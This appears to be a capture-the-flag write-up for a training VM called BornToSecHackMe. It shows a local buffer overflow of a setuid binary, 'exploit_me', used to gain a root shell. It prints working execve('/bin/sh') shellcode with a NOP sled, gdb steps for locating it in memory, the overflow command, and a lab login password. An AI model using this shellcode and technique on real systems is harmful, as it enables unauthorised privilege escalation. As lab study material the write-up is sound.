# another way to explose the bomb?

with writeup1 , we have the password zaz 646da671ca01bb5d84dbb5fb2238dc8e
so login again to our VM as zaz
so this time , we are still doing buffer overflow, but with different method
first all, put a shell code into the env:
export SHELLCODE=`python -c 'print "\x90" * 900 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`


Let's try to find the address of the shell code, again, use our old friend gdb:
`gdb -q exploit_me
 (gdb) b *main
 (gdb) r
 (gdb) x/200xs (char **)environ`
 we have:
 `0xbffff811:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"`


get the address with the shellcode which is 0xbffff811
    x/200x 0xbffff811
    we have:
  `  0xbffff811:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff819:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff821:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff829:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff831:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff839:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff841:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff849:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff851:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff859:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff861:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff869:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff871:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff879:	0x90	0x90	0x90	0x90	0x90	0x90	0xeb	0x1f
0xbffff881:	0x5e	0x89	0x76	0x08	0x31	0xc0	0x88	0x46
0xbffff889:	0x07	0x89	0x46	0x0c	0xb0	0x0b	0x89	0xf3
0xbffff891:	0x8d	0x4e	0x08	0x8d	0x56	0x0c	0xcd	0x80
0xbffff899:	0x31	0xdb	0x89	0xd8	0x40	0xcd	0x80	0xe8
0xbffff8a1:	0xdc	0xff	0xff	0xff	0x2f	0x62	0x69	0x6e
0xbffff8a9:	0x2f	0x73	0x68	0x00	0x53	0x48	0x45	0x4c
0xbffff8b1:	0x4c	0x3d	0x2f	0x62	0x69	0x6e	0x2f	0x62
0xbffff8b9:	0x61	0x73	0x68	0x00	0x54	0x45	0x52	0x4d
0xbffff8c1:	0x3d	0x78	0x74	0x65	0x72	0x6d	0x2d	0x32
0xbffff8c9:	0x35	0x36	0x63	0x6f	0x6c	0x6f	0x72	0x00
0xbffff8d1:	0x53	0x53	0x48	0x5f	0x43	0x4c	0x49	0x45`
    we see the detail, take a address starts with 0x90909090
    here i chose 0xbffff879

so try to exploit it:
`./exploit_me $(python -c 'print "i"*140 + "\x79\xf8\xff\xbf"')`

```sh
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "i"*140 + "\x79\xf8\xff\xbf"')
# whoami
root
```
